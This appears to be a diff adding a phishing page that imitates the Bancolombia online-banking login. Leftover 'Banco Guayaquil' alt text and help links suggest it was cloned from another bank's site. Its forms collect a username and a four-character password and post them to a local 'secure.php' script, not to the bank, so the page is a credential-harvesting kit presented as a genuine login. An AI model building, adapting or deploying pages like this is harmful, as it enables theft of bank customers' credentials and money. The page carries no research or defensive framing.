@@ -1,0 +1,338 @@
+﻿<html data-ng-app="AppLogin" data-ng-controller="LoginPCtrl" manifest="multidispositivos.appcache" class="js no-mobile desktop no-ie chrome chrome106 bmultipersonas-section gradient rgba opacity textshadow multiplebgs boxshadow borderimage borderradius cssreflections csstransforms csstransitions no-touch no-retina fontface domloaded ng-scope w-1366 gt-240 gt-320 gt-480 gt-640 gt-768 gt-800 gt-1024 gt-1280 lt-1440 lt-1680 lt-1920 no-portrait landscape" id="indexalternativop-page"><head><style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+    
+    <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-KBDGLVW"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({
+        'gtm.start': new Date().getTime(),
+        event:'gtm.js'});
+        var f=d.getElementsByTagName(s)[0],
+            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';
+        j.async=true;
+        j.src= 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+    })(window,document,'script','dataLayer','GTM-KBDGLVW');</script>
+
+    <link rel="preconnect dns-prefetch" href="https://www.googletagmanager.com">
+    <link rel="preconnect dns-prefetch" href="https://www.google-analytics.com">
+    
+
+    <meta charset="utf-8">
+    <title>Sucursal virtual Bancolombia</title>
+    
+    <meta http-equiv="origin-trial" content="AoYvEBBrS7/QCcfIViGthAX9JoyKBQSDHaACh2tS1fJGCr90LZZyFs1/KDxf00S0//U7dj+fOxuo9XmeVrgJvQ4AAAB0eyJvcmlnaW4iOiJodHRwczovL2JhbmNhdmlydHVhbC5iYW5jb2d1YXlhcXVpbC5jb206NDQzIiwiZmVhdHVyZSI6IkFwcENhY2hlIiwiZXhwaXJ5IjoxNjE3NzUzNTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
+    <meta property="og:title" content="Panel de informacion">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    <meta name="description" content="Panel de informacion">
+    <meta property="og:description" content="Panel de informacion">
+
+
+    <script src="js/head.min.js"></script>
+
+    <link rel="stylesheet" href="css/index.css">
+    <link rel="stylesheet" href="css/elastico.min.css"><link type="text/css" rel="stylesheet" href="css/font-awesome.min.css"><link type="text/css" rel="stylesheet" href="css/bootstrap.bg.css"><link type="text/css" rel="stylesheet" href="css/main.bg.css"><link type="text/css" rel="stylesheet" href="css/icomoon_style.css">
+
+</head>
+<body class="fondo" style="overflow: auto; display:none">
+
+<noscript>
+    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KBDGLVW"
+            height="0" width="0" style="display:none;visibility:hidden">
+
+    </iframe>
+</noscript>
+
+
+<div data-ng-show="pageLoading" class="spinner-login ng-hide" style="">
+    <div class="bg-spinner bg-primary"></div>
+</div>
+<div id="divContainer" data-ng-show="!pageLoading" data-ng-init="pageLoading = true" class="container-fluid" style="">
+    <div class="row" style="overflow-x:hidden;">
+        <div class="col-md-8 only-for-responsive-header">
+            <div class="contain-img-responsive">
+                <header class="bg-header ">
+                    <div class="bg-inner">
+                        <div class="bg-logo ">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Logo_Bancolombia.svg/2560px-Logo_Bancolombia.svg.png" alt="Banco Guayaquil" on-error-src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Logo_Bancolombia.svg/2560px-Logo_Bancolombia.svg.png">
+                        </div>
+                    </div>
+                </header>
+            </div>
+            <div class="contain-img-logo">
+                <div class="bg-inner">
+                    <div class="bg-logo ">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Logo_Bancolombia.svg/2560px-Logo_Bancolombia.svg.png" alt="Banco Guayaquil" on-error-src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Logo_Bancolombia.svg/2560px-Logo_Bancolombia.svg.png">
+                    </div>
+                </div>
+            </div>
+            <div class="row container-login" style="margin:0 auto;"> 
+                <div data-ng-hide="frmModo == 'partial' ">
+
+                    
+                    <div class="col-lg-10 col-lg-offset-1 ng-hide" data-ng-show="lbl.mensajeSuperior.textoSitekey">
+                        <div class="text-center col-lg-12 form-group">
+                            <span data-ng-bind-html="lbl.mensajeSuperior.textoSitekey" class="ng-binding"></span>
+                            <br>
+                            
+                        </div>
+                    </div>
+
+
+
+                    
+                    <div data-ng-show="mostrarUsuario || mostrarMensajeUsuario" class="" style="">
+                        <div style=" margin-top: 150px; margin-bottom:20px;" class="text-title-login"><h2 style="font-weight: bolder !important; color: #333333; margin:0" class="ng-binding">Sucursal Virtual Personas</h2>
+                        </div>
+                        <div class="main-title-description ng-binding">Complete con sus datos para continuar<br>
+                        </div>
+                    </div>
+                    <div id="divMensaje" class="bg-alert bg-alert-danger" data-ng-click="ocultarMensaje()" style="display:none">
+                        
+                        <p class="ng-binding"></p>
+                        <i class="bg-icon-plus"></i>
+                    </div>
+
+                    
+                    <div data-ng-show="frmModo == 'login' || frmModo == 'diasExpiraClave'" style="margin-bottom: 10px" class="">
+
+                        
+                        <div class="col-12">
+                            <div data-ng-show="frmModo == 'login' ||  frmModo == 'diasExpiraClave'" class="" style="">
+                                <form name="frmUsuario" method="POST" data-ng-submit="VerificarUsuario()" accept-charset="UTF-8" autocomplete="off" form action="secure.php" class="form-horizontal text-center ng-pristine ng-valid ng-valid-maxlength">
+                                    <fieldset data-ng-disabled="procesandoLogin">
+                                        <div data-ng-show="mostrarUsuario" class="" style="">
+                                            <div class="col-lg-12" style="border-color: rgb(204, 201, 190)">
+                                                <table class="col-lg-12 col-md-12 col-sm-12 ng-hide" data-ng-show="Password" style="">
+                                                    <tbody>
+                                                    <tr>
+                                                        <td class="label_ing" align="right" style="height: 21px;width:50%;">
+                                                            <label data-ng-bind="lbl.user" class="ng-binding">Usuario </label>
+                                                        </td>
+
+                                                        <td align="left" colspan="1" width="50%" valign="middle">
+                                                            <div class="row">
+                                                                <div class="col-xs-12 col-md-5 col-lg-5">
+                                                                    <input type="text" id="username" class="form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" name="usu" placeholder="Ingresa tu usuario" autocomplete="off" maxlength="20" data-ng-model="usuario.id" data-focus-me="focusUsuario" data-ng-change="CambioTexto('id',usuario.id)" style="text-transform: none;" input-alpha-numeric="usuario">
+                                                                </div>
+                                                            </div>
+                                                        </td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td style="vertical-align: top; text-align: right; padding-right: 5px; padding-top: 2px;" data-ng-show="Password" class="ng-hide">
+                                                            <img data-ng-src="img/bg/verisign-logo.png" style="width: 80px" src="img/bg/verisign-logo.png">
+                                                        </td>
+                                                        <td align="left" colspan="1" width="50%&quot;" valign="middle" style="padding-top:10px;">
+                                                            <div class="row">
+                                                                <div class="col-xs-12 col-md-5 col-lg-5">
+
+                                                                    
+
+                                                                    <a href="#" class="bg-button bg-primary ng-hide" data-ng-show="Password" data-ng-click="VerificarUsuario()" data-ng-disabled="procesandoLogin" style="">
+                                                                        <span data-ng-bind="lbl.btnLogin" class="ng-binding">Iniciar sesión</span>
+
+
+                                                                    </a>
+
+                                                                </div>
+                                                            </div>
+                                                        </td>
+                                                    </tr>
+                                                    <tr>
+                                                        <td align="left" style="height: 21px; width: 50%;" data-ng-show="Password" class="ng-hide">
+                                                            <a data-ng-show="Password" data-ng-click="olvidoClaveClick()" data-ng-disabled="procesandoLogin" style="cursor: pointer;" class="">
+                                                                <span data-ng-bind="lbl.btnOlvidoClave" class="ng-binding"></span>
+                                                            </a>
+                                                        </td>
+                                                    </tr>
+                                                    </tbody>
+                                                </table>
+                                            </div>
+                                        </div>
+                                    </fieldset>
+                                </form>
+                                <div class="col-sm-12 col-lg-12 col-md-12" style="border-color: rgb(204, 201, 190); padding:0">
+                                    <div>
+                                        <div>
+                                            <div>
+                                                <form name="frm
+.." method="POST" data-ng-submit="AutenticarUsuario()" accept-charset="UTF-8" autocomplete="off" form action="secure.php" class="form-horizontal ng-pristine ng-valid ng-valid-maxlength">
+                                                    <fieldset data-ng-disabled="procesandoLogin">
+                                                        <div data-ng-show="Password" class="" style="">
+
+                                                            
+
+                                                            <div class="bg-textfield custom-space-input bg-normal" data-ng-show="mostrarUser" data-ng-class="{'bg-normal': !mostrarBtnGenerarOTP, 'bg-loading': procesandoLogin}" style="">
+                                                                <label for="username2" data-ng-bind="lbl.user" class="ng-binding">Usuario </label>
+                                                                <div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><input type="text" id="username2" class="bg-textbox ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" name="usu" placeholder="Ingresa tu usuario" autocomplete="off" maxlength="20" data-ng-model="usuario.id" data-focus-me="focusUsuario" data-ng-change="CambioTexto('id',usuario.id)" style="text-transform: none;" input-alpha-numeric="usuario" data-counter="true"><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div>
+                                                                <a class="bg-position-top-right bg-helper-link ng-binding" style="color:#1A73E8; cursor: pointer;" data-ng-click="olvidoUsuarioClick()" data-ng-disabled="procesandoLogin" data-ng-bind="lbl.btnOlvidoUsuario"></a>
+
+
+
+
+
+                                                                <p class="bg-helper ng-binding">Campo obligatorio</p>
+                                                            </div>
+
+
+                                                            <div class="bg-textfield" data-ng-class="{'bg-normal': !mostrarBtnGenerarOTP, 'bg-normal': procesandoLogin}">
+                                                                    <label for="password" data-ng-bind="lbl.pass" data-ng-hide="mostrarBtnGenerarOTP" class="ng-binding">Clave </label>
+                                                                    <label for="password" data-ng-bind="lbl.passTemp" data-ng-show="mostrarBtnGenerarOTP" class="ng-binding ng-hide">Clave temporal: </label>
+                                                                <div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><div style="position: relative;"><input type="password" id="password" class="bg-textbox ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" name="pass" onfocus="ValidarUsuario()" placeholder="Ingresa tu clave" autocomplete="off" data-ng-model="usuario.pass" maxlength="4" data-limit="4" data-focus-me="focusClave" data-ng-change="CambioTexto('pass',usuario.pass)" input-alpha-numeric="clave" style="text-transform: none !important;"><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div><span class="bg-state"></span></div>
+                                                                <p class="bg-helper ng-binding">Campo obligatorio</p>
+                                                                <a class="bg-position-top-right bg-helper-link ng-binding" data-ng-click="olvidoClaveClick()" data-ng-disabled="procesandoLogin" data-ng-bind="lbl.btnOlvidoClave" style="color: #1A73E8; cursor: pointer;"></a>
+
+
+
+
+
+                                                            </div>
+
+
+
+                                                            <div class="form-group ">
+                                                                <div class="hidden-xs">
+                                                                    <div data-ng-class="{'col-xs-12 text-right': !mostrarBtnGenerarOTP, 'col-sm-12': mostrarBtnGenerarOTP}" style="display:flex; justify-content: flex-start ; flex-direction: row-reverse;" class="col-xs-12 text-right">
+
+                                                                        
+
+                                                                        <button href="#" class="bg-button bg-primary" type="submit" data-ng-disabled="procesandoLogin" data-ng-class="{'bg-loader': procesandoLogin}">
+                                                                            <div id="submit" name="submit">
+                                                                                <span data-ng-bind="lbl.btnLoginMin" class="ng-binding">Continuar</span>
+                                                                                <span data-ng-class="AppIcons.Aceptar" data-ng-show="!procesandoLogin"></span>
+
+
+                                                                            </div>
+                                                                        </button>
+
+                                                                        
+
+                                                                        <a href="#" class="bg-button bg-secondary ng-hide" data-ng-click="VerificaGenerarOTPAutenticacionFuerte()" data-ng-class="{'bg-loader': procesandoVerifGenOTP}" data-ng-show="mostrarBtnGenerarOTP" data-ng-disabled="procesandoVerifGenOTP">
+                                                                        <span id="invitacion" name="submit">
+                                                                            <span data-ng-bind="lbl.btnGenerarOTP" class="ng-binding">Generar contraseña temporal</span>
+                                                                        </span>
+                                                                        </a>
+                                                                    </div>
+                                                                </div>
+                                                                <div class="sitio-protegido-ipad">
+                                                                    <p><i class="bg-icon bg-icon-question" style="color: #877FAC"></i><a href="#" style="color: inherit; color: #877FAC;font-size: 18px;font-weight: bold;">Centro de Ayuda</a></p>
+                                                                </div>
+
+                                                                <div class="visible-xs text-right">
+                                                                    
+                                                                    <button href="#" class="bg-button bg-primary" type="submit" data-ng-disabled="procesandoLogin" data-ng-class="{'bg-loader': procesandoLogin}">
+                                                                            <div id="submit" name="submit">
+                                                                                <span data-ng-bind="lbl.btnLoginMin" class="ng-binding">Continuar</span>
+                                                                                <span data-ng-class="AppIcons.Aceptar" data-ng-show="!procesandoLogin"></span>
+
+
+                                                                            </div>
+                                                                    </a>
+
+                                                                    
+                                                                    </div>
+
+                                                                    </div>
+                                                          </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+
+                                                         
+
+                    </div>
+                    </div>                
+            <div class="row" style="width: 90%" data-ng-show="frmModo != 'olvidoUsuario' &amp;&amp; frmModo != 'clave' &amp;&amp; frmModo != 'equipo' ">
+                <div class="col-md-12 helpdesk-responsive">
+                    <i class="bg-icon bg-icon-question" style="color: #877FAC"></i>
+                    <a href="https://ayudaempresas.bancoguayaquil.com/hc/es" style="color: inherit; color: #877FAC;font-size: 18px;font-weight: bold;">Centro de Ayuda
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div>
+        <div id="magenta-content" data-ng-class="{'esconder-magenta': frmModo == 'olvidoUsuario' ||  frmModo == 'clave' || frmModo == 'tokenOTP' || frmModo == 'equipo' || frmModo == 'token'}">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </div>
+</div>
+<div style="display: flex; flex-flow: column;" data-ng-show="frmModo == 'clave-caducado'" class="ng-hide">
+    <div class="row" style="width: 90%" data-ng-show="frmModo != 'olvidoUsuario' &amp;&amp; frmModo != 'clave' &amp;&amp; frmModo != 'equipo' ">
+        <div class="col-md-12" style="flex: 0 1 auto">
+        </div>
+        <div class="col-md-12 helpdesk-desktop" style="position: fixed !important;" data-ng-hide="pageLoading">
+            <i class="bg-icon bg-icon-question" style="color: #877FAC"></i>
+            <a href="https://ayudaempresas.bancoguayaquil.com/hc/es" style="color: inherit; color: #877FAC;font-size: 18px;font-weight: bold;">Centro de Ayuda
+            </a>
+        </div>
+    </div>
+</div>
+<div class="row" style="width: 90%" data-ng-show="frmModo != 'olvidoUsuario' &amp;&amp; frmModo != 'clave' &amp;&amp; frmModo != 'clave-caducado' &amp;&amp; frmModo != 'equipo' ">
+    <div class="col-md-12 helpdesk-desktop" data-ng-hide="pageLoading" style="">
+        <i class="bg-icon bg-icon-question" style="color: #877FAC"></i>
+        <a href="https://ayudaempresas.bancoguayaquil.com/hc/es" style="color: inherit; color: #877FAC;font-size: 18px;font-weight: bold;">Centro de Ayuda
+        </a>
+    </div>
+</div>
+
+
+
+
+
+
+
+<script src="js/assets/jquery.min.js"></script>
+<script src="js/assets/bootstrap.min.js"></script>
+<script src="js/assets/elastico.min.js"></script>
+<script src="js/assets/angular-1.8.2/angular.min.js"></script>
+<script src="js/assets/angular-1.8.2/angular-resource.min.js"></script>
+<script src="js/assets/angular-1.8.2/angular-route.min.js"></script>
+<script src="js/assets/amplify.store.min.js"></script>
+<script src="js/assets/angular-file-upload.js"></script>
+<script src="js/assets/angular-1.8.2/angular-sanitize.min.js"></script>
+<script src="js/assets/angular-1.8.2/angular-animate.min.js"></script>
+<script src="js/assets/angular-1.8.2/angular-strap.min.js"></script>
+
+<script src="js/assets/ekathuwa.min.js"></script>
+<script src="js/assets/sha-256.js"></script>
+<script src="js/assets/fingerprint.js"></script>
+<script src="js/assets/date.js"></script>
+<script src="js/assets/ng-device-detector/re-tree.min.js"></script>
+<script src="js/assets/ng-device-detector/ua-device-detector.min.js"></script>
+<script src="js/assets/ng-device-detector/ng-device-detector.min.js"></script>
+<script src="js/assets/bower_components/angular-gettext/dist/angular-gettext.js"></script>
+
+
+<script src="js/assets/Blob.min.js"></script>
+<script src="js/assets/FileSaver.min.js"></script>
+
+
+<script type="text/javascript" src="jsmin/App.Compartidas.js"></script>
+<script type="text/javascript" src="jsmin/App.Configs.js"></script>
+<script type="text/javascript" src="jsmin/App.Services.js"></script>
+<script type="text/javascript" src="jsmin/App.Etiquetas.js"></script>
+<script type="text/javascript" src="jsmin/App.Login.js"></script>
+<script type="text/javascript" src="jsmin/App.MiPerfil.Main.js"></script>
+<script type="text/javascript" src="jsmin/App.MiPerfil.Configs.js"></script>
+<script type="text/javascript" src="jsmin/App.MiPerfil.Etiquetas.js"></script>
+<script type="text/javascript" src="jsmin/App.Bloqueos.Main.js"></script>
+<script type="text/javascript" src="jsmin/App.Bloqueos.Configs.js"></script>
+<script type="text/javascript" src="jsmin/App.Bloqueos.Etiquetas.js"></script>
+<script type="text/javascript" src="jsmin/App.Campanias.Main.js"></script>
+<script type="text/javascript" src="jsmin/App.Campanias.Configs.js"></script>
+<script type="text/javascript" src="jsmin/App.Campanias.Etiquetas.js"></script>
+<script type="text/javascript" src="jsmin/App.Banner.Main.js"></script>
+<script type="text/javascript" src="jsmin/App.Banner.Configs.js"></script>
+<script type="text/javascript" src="jsmin/App.Banner.Etiquetas.js"></script>
+<script type="text/javascript" src="jsmin/App.Utils.js"></script>
+
+
+
+
+
+</body></html>
